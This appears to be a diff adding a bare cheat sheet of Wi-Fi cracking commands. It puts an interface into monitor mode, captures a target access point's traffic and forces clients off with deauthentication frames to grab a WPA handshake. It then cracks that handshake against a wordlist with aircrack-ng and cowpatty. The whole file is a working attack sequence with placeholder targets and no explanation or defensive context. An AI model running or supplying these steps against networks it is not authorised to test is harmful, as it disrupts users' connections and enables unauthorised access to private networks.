@@ -1,0 +1,7 @@
+airmon-ng start <IF>
+airodump-ng <IFmon>
+airodump-ng --bssid <BSSID> --write ./dumps/<AP> <IFmon>
+aireplay-ng --deauth <number of times> -a <BSSID> mon0
+
+aircrack-ng <capfile.cap> -w <wordlist>
+cowpatty -r <capfile.cap> -f <wordlist> -s <ESSID>
